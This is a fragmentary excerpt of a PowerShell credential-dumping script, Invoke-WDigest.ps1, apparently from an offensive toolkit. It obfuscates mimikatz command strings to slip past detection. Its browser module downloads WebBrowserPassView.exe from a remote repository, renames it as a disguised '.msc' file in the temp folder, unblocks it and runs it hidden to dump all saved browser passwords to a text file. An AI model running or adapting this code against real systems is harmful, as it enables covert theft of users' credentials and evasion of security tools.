...
.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'false' -manycats -module 'browser'
   Dump browser creds using WebBrowserPassView (nirsoft) without WDigest caching
...
If($ManyCats.IsPresent)
{
   ...
   If($Wdigest -Match '^(true)$')
   {
      ...
      .Parameter module
         Accepts values 'false', 'auto', 'browser' Or
         m[i]mika[t]z multiple 'dump::modules exit'
      #>

      If($Module -Match '^(false)$')
      {
         $Sting = "sek%url@sa:@:wd@ig%est"
         $AutomaticExecution = $Sting -replace '%','' -replace '@',''
         write-host " $AutomaticExecution" -ForegroundColor DarkYellow -NoNewline
      ...
      ElseIf($Module -iMatch '^(browser)$')
      {
         write-host "`n    [" -ForegroundColor Red -NoNewline
         write-host "WDigest" -NoNewline
         write-host "] patch its not required to dump browser creds.`n" -ForegroundColor Red
         Start-Sleep -Milliseconds 700

         ## Dump all browsers credentials
         iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/WebBrowserPassView.exe" -OutFile "$Env:TMP\NavigatorView.msc"|Unblock-File
         Start-Process -WindowStyle Hidden powershell -ArgumentList ".\NavigatorView.msc /stext webbrowser.txt" -Wait
   ...
   Else
   {
      ...
      .Parameter module
         Accepts values 'false' (interactive shell), 'auto',
         'browser' Or m[i]mika[t]z multiple 'dump::modules exit'
      #>
